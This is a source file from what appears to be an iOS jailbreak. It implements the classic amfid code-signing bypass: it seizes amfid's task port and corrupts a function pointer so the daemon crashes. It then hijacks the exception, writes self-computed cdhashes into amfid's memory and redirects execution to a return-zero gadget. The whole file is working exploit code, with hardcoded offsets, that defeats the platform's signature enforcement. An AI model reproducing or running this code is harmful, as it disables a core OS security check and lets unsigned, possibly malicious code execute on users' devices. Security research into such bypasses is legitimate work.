#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach-o/loader.h>


#include <pthread/pthread.h>


#include "mach_stuff.h"
#include "cdhash.h"

pthread_t exceptionThread;



/*
 
 classic amfid bypass: 1. make amfid crash 2. Set exception handler in our proc 3. calculate cdhash ourselves 4. Set PC and return execution to amfid
 
 */

#define MISValidateSignatureAndCopyInfo_ptr 0x10120
#define RET0_GADGET 0x35C8



kern_return_t kret;
vm_address_t ret0_gadget;

mach_port_t amfid_task_port = MACH_PORT_NULL;
mach_port_name_t exceptionPort = MACH_PORT_NULL;

typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    mach_msg_port_descriptor_t thread;
    mach_msg_port_descriptor_t task;
    NDR_record_t NDR;
} exception_raise_request;

typedef struct {
  mach_msg_header_t Head;
  NDR_record_t NDR;
  kern_return_t RetCode;
} exception_raise_reply;

uint32_t amfid_write32(uint64_t where, uint32_t what) {
    
    kret = mach_vm_write(amfid_task_port, where, (vm_offset_t)&what, (mach_msg_type_number_t)sizeof(uint32_t));
    
    if (kret != KERN_SUCCESS) {
        util_error("amfid_write32 failed");
        return KERN_SUCCESS;
    }
    
    return KERN_SUCCESS;
    
}



uint32_t amfid_read32(vm_address_t where) {
    
    
    size_t size = 4;
    uint32_t data = 0;
    
    kret = mach_vm_read_overwrite(amfid_task_port, where, (mach_vm_size_t)size, &data, &size);
    
    if (kret != KERN_SUCCESS) {
        util_error("amfid_read32 failed\n");
        return KERN_SUCCESS;
    }
    
    return data;
    
}



void* amfid_read(uint64_t addr, uint64_t len) {
    kern_return_t ret;
    vm_offset_t buf = 0;
    mach_msg_type_number_t num = 0;
    ret = mach_vm_read(amfid_task_port, addr, len, &buf, &num);
    if (ret != KERN_SUCCESS) {
        util_error("amfid read failed");
        return NULL;
    }
    uint8_t* outbuf = malloc(len);
    memcpy(outbuf, (void*)buf, len);
    mach_vm_deallocate(mach_task_self(), buf, num);
    return outbuf;
}

uint64_t find_text_base() {
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL;
    
    mach_vm_address_t first_addr = 0;
    mach_vm_size_t first_size = 0x1000;
    
    struct vm_region_basic_info_64 region = {0};
    
    kern_return_t err = mach_vm_region(amfid_task_port, &first_addr, &first_size, VM_REGION_BASIC_INFO_64, (vm_region_info_t)&region, &region_count, &object_name);
    if (err != KERN_SUCCESS) {
        util_error("failed to find __TEXT segment");
        return KERN_SUCCESS;
    }
    
    return first_addr;
}

void *amfid_exception_handler(void* arg) {
    
    
    uint32_t msg_size = 0x1000;
    mach_msg_header_t* msg = malloc(msg_size);
    for(;;) {
    kret = mach_msg(msg, MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, 0, msg_size, exceptionPort, 0, 0);
    if (kret != KERN_SUCCESS) {
        printf("Failed to receive exception port\n");
        continue;
    }
    else {
        exception_raise_request* request = (exception_raise_request*)msg;
        mach_port_t thread_port = request->thread.name;
        mach_port_t task_port = request->task.name;
        
        _STRUCT_ARM_THREAD_STATE64 old_state = {0};
        mach_msg_type_number_t old_stateCnt = sizeof(old_state)/4;
        
        kret = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt);
                    if (kret != KERN_SUCCESS){
                        printf("Failed to get thread state from amfid\n");
                        continue;
                    }
        
        _STRUCT_ARM_THREAD_STATE64 new_state;
        memcpy(&new_state, &old_state, sizeof(_STRUCT_ARM_THREAD_STATE64));
        
        char *file = (char*)amfid_read(new_state.__x[22], 1024);
        
        if (!file) {
            printf("No file inputted to amfid?!\n");
            continue;
        }
        
            printf("[*] got amfid request: %s\n", file);
        
        // compute cdhash
        
        FILE* fp = fopen(file, "rb");
        fseek(fp, 0, SEEK_END);
        size_t len = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        void *file_to_compute = (void*)malloc(len);
        fread(file_to_compute, 1, len, fp);
        fclose(fp);
        
        uint8_t cdhash[CS_CDHASH_LEN];
        compute_cdhash(file_to_compute, len, cdhash);
        printf("[*] Got CDHASH for %s\n", file);
        for (int i = 0; i < CS_CDHASH_LEN; i++) {
                printf("%02x ", cdhash[i]);
        }
        
        printf("\n");
        
        free(file_to_compute);
        
        // write cdhash to amfid
        
        kret = mach_vm_write(amfid_task_port, old_state.__x[23], (vm_offset_t)&cdhash, 20);
        if (kret != KERN_SUCCESS) {
            printf("Failed to write cdhash to amfid\n");
            return KERN_SUCCESS;
        }
        
        
        
        printf("[*] Wrote CDHASH to amfid\n");
        
        amfid_write32(old_state.__x[26], 1);
        new_state.__pc = ret0_gadget;
        
        kret = thread_set_state(thread_port, 6, (thread_state_t)&new_state, sizeof(new_state)/4);
        if (kret != KERN_SUCCESS) {
            printf("Failed to set new thread state\n");
            return KERN_SUCCESS;
        }
        
        printf("[*] Set new thread state\n");
        
        exception_raise_reply reply = {0};
                    
                    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(request->Head.msgh_bits), 0);
                    reply.Head.msgh_size = sizeof(reply);
                    reply.Head.msgh_remote_port = request->Head.msgh_remote_port;
                    reply.Head.msgh_local_port = MACH_PORT_NULL;
                    reply.Head.msgh_id = request->Head.msgh_id + 0x64;
                    
                    reply.NDR = request->NDR;
                    reply.RetCode = KERN_SUCCESS;
                    
                    kret = mach_msg(&reply.Head,
                                   1,
                                   (mach_msg_size_t)sizeof(reply),
                                   0,
                                   MACH_PORT_NULL,
                                   MACH_MSG_TIMEOUT_NONE,
                                   MACH_PORT_NULL);
        
        mach_port_deallocate(mach_task_self(), thread_port);
        mach_port_deallocate(mach_task_self(), task_port);
       
        
        
        
        
        
    }
        
    
    
    
}
}


int takeOverAMFID(int amfid_pid) {
    
    
    
    
    kret = task_for_pid(mach_task_self(), amfid_pid, &amfid_task_port);
    if (kret != KERN_SUCCESS) {
        util_error("[-] task_for_pid failed on amfid");
        return KERN_SUCCESS;
    }
    
    
    util_info("amfid task_port: 0x%x", amfid_task_port);
    uint64_t amfid_text_base = find_text_base();
    uint32_t read = amfid_read32(amfid_text_base);
    util_info("amfid __TEXT: %08x", read);
    vm_address_t MISValidateSignatureAndCopyInfo = amfid_text_base + MISValidateSignatureAndCopyInfo_ptr;
    ret0_gadget = amfid_text_base + RET0_GADGET;
    util_info("MISValidateSignatureAndCopyInfo: 0x%lx", MISValidateSignatureAndCopyInfo);
    util_info("ret0 gadget: 0x%lx", ret0_gadget);
    
    
    kret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exceptionPort);
    if (kret != KERN_SUCCESS) {
        util_error("Failed to allocate amfid exception port");
        return KERN_SUCCESS;
    }
    
    kret = mach_port_insert_right(mach_task_self(), exceptionPort, exceptionPort, (mach_msg_type_name_t)MACH_MSG_TYPE_MAKE_SEND);
    if (kret != KERN_SUCCESS) {
        util_error("Failed to insert exception port");
        return KERN_SUCCESS;
    }
    
    kret = task_set_exception_ports(amfid_task_port, (mach_port_t)EXC_MASK_BAD_ACCESS, exceptionPort, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
    if (kret != KERN_SUCCESS) {
        util_error("Failed to set exception port");
        return KERN_SUCCESS;
    }
    
    pthread_create(&exceptionThread, NULL, amfid_exception_handler, NULL);
    
    util_info("Set amfid exception port");
    
    kret = vm_protect(amfid_task_port, mach_vm_trunc_page(MISValidateSignatureAndCopyInfo), vm_page_size, false, VM_PROT_READ | VM_PROT_WRITE);
    
    if (kret != KERN_SUCCESS) {
        util_error("Could not vm_protect amfid page");
        return KERN_SUCCESS;
    }
    
    
    
    amfid_write32(MISValidateSignatureAndCopyInfo, 0x41414141);
    
    
    
    
    
    return KERN_SUCCESS;
}


